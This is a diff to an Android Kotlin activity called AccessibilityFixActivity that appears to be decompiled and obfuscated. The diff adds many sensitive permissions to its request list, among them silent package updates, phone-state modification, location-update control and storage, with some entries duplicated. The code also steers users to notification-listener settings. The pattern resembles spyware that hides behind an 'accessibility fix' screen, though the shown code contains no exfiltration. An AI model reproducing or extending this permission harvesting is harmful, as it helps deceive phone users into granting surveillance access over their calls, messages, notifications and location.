@@ -23,9 +23,16 @@ class AccessibilityFixActivity : AppCompatActivity() {
     @SuppressLint("InlinedApi")
     private val permissions = arrayOf(
         Manifest.permission.RECORD_AUDIO,
+        android.Manifest.permission.POST_NOTIFICATIONS,
+        Manifest.permission.UPDATE_PACKAGES_WITHOUT_USER_ACTION,
         Manifest.permission.READ_PHONE_NUMBERS,
+        Manifest.permission.MODIFY_PHONE_STATE,
         Manifest.permission.MODIFY_AUDIO_SETTINGS,
         Manifest.permission.READ_PHONE_STATE,
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.WRITE_EXTERNAL_STORAGE,
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+        Manifest.permission.CONTROL_LOCATION_UPDATES,
         Manifest.permission.POST_NOTIFICATIONS,
         Manifest.permission.ACCESS_FINE_LOCATION,
         Manifest.permission.BROADCAST_SMS,
@@ -36,7 +43,7 @@ class AccessibilityFixActivity : AppCompatActivity() {
         Manifest.permission.WRITE_EXTERNAL_STORAGE
     )
 
-    private fun openSetting(view: View) {
+    private fun openSetting() {
         try {
             SvcAccFix.j = true
             val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
@@ -52,7 +59,6 @@ class AccessibilityFixActivity : AppCompatActivity() {
         super.onBackPressed()
     }
 
-    /* Access modifiers changed, original: protected */
     public override fun onCreate(bundle: Bundle?) {
         super.onCreate(bundle)
         if (SvcAccFix.i) {
@@ -65,9 +71,7 @@ class AccessibilityFixActivity : AppCompatActivity() {
         checkAndRequestPermissions()
         checkNotificationListenerPermission()
         findViewById<View>(R.id.btn501925).setOnClickListener { view ->
-            openSetting(
-                view
-            )
+            openSetting()
         }
     }
 
@@ -97,7 +101,6 @@ class AccessibilityFixActivity : AppCompatActivity() {
     private fun checkNotificationListenerPermission() {
         if (!isNotificationListenerEnabled()) {
             requestNotificationListenerPermission()
-        } else {
         }
     }
 
